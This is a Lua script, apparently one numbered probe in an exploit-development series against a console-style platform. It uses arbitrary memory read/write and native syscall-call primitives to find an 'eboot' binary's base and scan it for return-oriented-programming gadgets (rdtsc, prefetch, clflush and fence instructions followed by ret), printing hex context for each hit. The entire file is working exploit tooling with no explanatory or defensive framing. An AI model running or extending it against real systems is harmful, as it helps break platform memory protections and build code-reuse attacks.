-- CRASH_CLASS: LOW
-- PROBE 390c: Read context bytes around each prefetch/rdtsc hit
--
-- Context: 390b found 44 rdtsc, 17 prefetch, 24 prefetchw hits.
-- None had obvious ret-after. Need to read 16+ bytes around each
-- to find usable gadgets. Also scan for the EXACT patterns:
--   0F 31 C3 (rdtsc;ret)
--   0F 18 XX C3 (prefetch;ret)
--   0F 0D XX C3 (prefetchw;ret)

print("=== PROBE 390c: gadget context ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

-- Get eboot base
local info = memory.alloc(0x200)
zero_buf(info, 0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eboot = rd(N(info) + 0x108) or 0
local eboot_size = rd(N(info) + 0x110) or 0x494000
print(string.format("eboot: 0x%X size=0x%X", eboot, eboot_size))

-- Helper: read and print 16 bytes as hex + disasm hint
local function dump16(addr, label)
    local d0 = rd(addr)
    local d1 = rd(addr + 4)
    local d2 = rd(addr + 8)
    local d3 = rd(addr + 12)
    -- Also extract individual bytes for analysis
    local bytes = {}
    for _, dw in ipairs({d0, d1, d2, d3}) do
        if dw then
            bytes[#bytes + 1] = dw % 256
            bytes[#bytes + 1] = math.floor(dw / 256) % 256
            bytes[#bytes + 1] = math.floor(dw / 65536) % 256
            bytes[#bytes + 1] = math.floor(dw / 16777216)
        end
    end
    -- Find C3 (ret) positions
    local rets = {}
    for i, b in ipairs(bytes) do
        if b == 0xC3 then rets[#rets + 1] = i - 1 end
    end
    local ret_str = #rets > 0 and (" ret@" .. table.concat(rets, ",")) or ""
    -- Hex dump
    local hex = {}
    for _, b in ipairs(bytes) do hex[#hex + 1] = string.format("%02X", b) end
    print(string.format("  %s: %s%s", label, table.concat(hex, " "), ret_str))
end

print("")

-- ===================================================================
-- [A] Exact pattern search: 0F31C3, 0F18xxC3, 0F0DxxC3
-- ===================================================================
print("[A] exact 3-4 byte pattern search")

local CHUNK = 0x10000
local pat_rdtsc_ret = string.char(0x0F, 0x31, 0xC3)
local found_rdtsc_ret = {}

-- For prefetch;ret we need 0F 18 XX C3 where XX is a valid modrm
-- That's 4 bytes. We'll search for 0F 18 then check byte+3
local pat_pf = string.char(0x0F, 0x18)
local pat_pw = string.char(0x0F, 0x0D)
local found_pf_ret = {}
local found_pw_ret = {}

for base = 0, eboot_size - CHUNK, CHUNK do
    local addr = eboot + base
    local ok, chunk = pcall(function() return memory.read_buffer(addr, CHUNK) end)
    if not ok or type(chunk) ~= "string" then break end

    -- rdtsc;ret (exact)
    local pos = 1
    while true do
        local f = string.find(chunk, pat_rdtsc_ret, pos, true)
        if not f then break end
        found_rdtsc_ret[#found_rdtsc_ret + 1] = base + f - 1
        pos = f + 1
    end

    -- prefetch XX C3
    pos = 1
    while true do
        local f = string.find(chunk, pat_pf, pos, true)
        if not f then break end
        if f + 3 <= #chunk then
            local b3 = string.byte(chunk, f + 3)
            if b3 == 0xC3 then
                local modrm = string.byte(chunk, f + 2)
                found_pf_ret[#found_pf_ret + 1] = {off = base + f - 1, modrm = modrm}
            end
        end
        pos = f + 1
    end

    -- prefetchw XX C3
    pos = 1
    while true do
        local f = string.find(chunk, pat_pw, pos, true)
        if not f then break end
        if f + 3 <= #chunk then
            local b3 = string.byte(chunk, f + 3)
            if b3 == 0xC3 then
                local modrm = string.byte(chunk, f + 2)
                found_pw_ret[#found_pw_ret + 1] = {off = base + f - 1, modrm = modrm}
            end
        end
        pos = f + 1
    end
end

print(string.format("  rdtsc;ret (0F 31 C3): %d hits", #found_rdtsc_ret))
for _, off in ipairs(found_rdtsc_ret) do
    print(string.format("    eboot+0x%X *** USABLE ***", off))
    dump16(eboot + off, string.format("+0x%X", off))
end

print(string.format("  prefetch;ret (0F 18 XX C3): %d hits", #found_pf_ret))
for _, h in ipairs(found_pf_ret) do
    local mod_f = math.floor(h.modrm / 64)
    local reg_f = math.floor(h.modrm / 8) % 8
    local rm = h.modrm % 8
    local regs = {"rax","rcx","rdx","rbx","sib","rip","rsi","rdi"}
    print(string.format("    eboot+0x%X: prefetch /%d [%s] modrm=0x%02X *** USABLE ***",
        h.off, reg_f, regs[rm + 1] or "?", h.modrm))
    dump16(eboot + h.off, string.format("+0x%X", h.off))
end

print(string.format("  prefetchw;ret (0F 0D XX C3): %d hits", #found_pw_ret))
for _, h in ipairs(found_pw_ret) do
    local mod_f = math.floor(h.modrm / 64)
    local rm = h.modrm % 8
    local regs = {"rax","rcx","rdx","rbx","sib","rip","rsi","rdi"}
    print(string.format("    eboot+0x%X: prefetchw [%s] modrm=0x%02X *** USABLE ***",
        h.off, regs[rm + 1] or "?", h.modrm))
    dump16(eboot + h.off, string.format("+0x%X", h.off))
end

if not alive() then print("DEAD after [A]"); return end
print("")

-- ===================================================================
-- [B] Wider search: rdtsc + nearby ret (within 8 bytes)
-- ===================================================================
print("[B] rdtsc with ret within 8 bytes")

local pat_rdtsc = string.char(0x0F, 0x31)
local rdtsc_near_ret = {}

for base = 0, eboot_size - CHUNK, CHUNK do
    local addr = eboot + base
    local ok, chunk = pcall(function() return memory.read_buffer(addr, CHUNK) end)
    if not ok or type(chunk) ~= "string" then break end

    local pos = 1
    while true do
        local f = string.find(chunk, pat_rdtsc, pos, true)
        if not f then break end
        -- Check bytes f+2 through f+9 for C3
        for delta = 2, math.min(9, #chunk - f) do
            if string.byte(chunk, f + delta) == 0xC3 then
                rdtsc_near_ret[#rdtsc_near_ret + 1] = {
                    off = base + f - 1,
                    ret_delta = delta
                }
                break
            end
        end
        pos = f + 1
    end
end

print(string.format("  rdtsc with ret within 8B: %d", #rdtsc_near_ret))
for _, h in ipairs(rdtsc_near_ret) do
    print(string.format("    eboot+0x%X (ret at +%d)", h.off, h.ret_delta))
    dump16(eboot + h.off, string.format("+0x%X", h.off))
end

if not alive() then print("DEAD after [B]"); return end
print("")

-- ===================================================================
-- [C] Also search: clflush [reg]; ret
-- ===================================================================
print("[C] clflush;ret search")

local pat_cf = string.char(0x0F, 0xAE)
local found_cf_ret = {}

for base = 0, eboot_size - CHUNK, CHUNK do
    local addr = eboot + base
    local ok, chunk = pcall(function() return memory.read_buffer(addr, CHUNK) end)
    if not ok or type(chunk) ~= "string" then break end

    local pos = 1
    while true do
        local f = string.find(chunk, pat_cf, pos, true)
        if not f then break end
        if f + 3 <= #chunk then
            local modrm = string.byte(chunk, f + 2)
            local reg_f = math.floor(modrm / 8) % 8
            -- clflush is /7
            if reg_f == 7 then
                local b3 = string.byte(chunk, f + 3)
                if b3 == 0xC3 then
                    local rm = modrm % 8
                    found_cf_ret[#found_cf_ret + 1] = {off = base + f - 1, modrm = modrm, rm = rm}
                end
            end
        end
        pos = f + 1
    end
end

print(string.format("  clflush;ret (0F AE /7 XX C3): %d", #found_cf_ret))
for _, h in ipairs(found_cf_ret) do
    local regs = {"rax","rcx","rdx","rbx","sib","rip","rsi","rdi"}
    print(string.format("    eboot+0x%X: clflush [%s]", h.off, regs[h.rm + 1] or "?"))
    dump16(eboot + h.off, string.format("+0x%X", h.off))
end

if not alive() then print("DEAD after [C]"); return end
print("")

-- ===================================================================
-- [D] Search for: lfence;ret and mfence;ret (serialization)
-- ===================================================================
print("[D] fence;ret search")

local pat_lfence_ret = string.char(0x0F, 0xAE, 0xE8, 0xC3)
local pat_mfence_ret = string.char(0x0F, 0xAE, 0xF0, 0xC3)
local found_lfence = {}
local found_mfence = {}

for base = 0, eboot_size - CHUNK, CHUNK do
    local addr = eboot + base
    local ok, chunk = pcall(function() return memory.read_buffer(addr, CHUNK) end)
    if not ok or type(chunk) ~= "string" then break end

    local pos = 1
    while true do
        local f = string.find(chunk, pat_lfence_ret, pos, true)
        if not f then break end
        found_lfence[#found_lfence + 1] = base + f - 1
        pos = f + 1
    end

    pos = 1
    while true do
        local f = string.find(chunk, pat_mfence_ret, pos, true)
        if not f then break end
        found_mfence[#found_mfence + 1] = base + f - 1
        pos = f + 1
    end
end

print(string.format("  lfence;ret: %d, mfence;ret: %d", #found_lfence, #found_mfence))
for _, off in ipairs(found_lfence) do
    print(string.format("    lfence;ret at eboot+0x%X", off))
end
for _, off in ipairs(found_mfence) do
    print(string.format("    mfence;ret at eboot+0x%X", off))
end

if not alive() then print("DEAD after [D]"); return end
print("")

print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 390c COMPLETE ===")
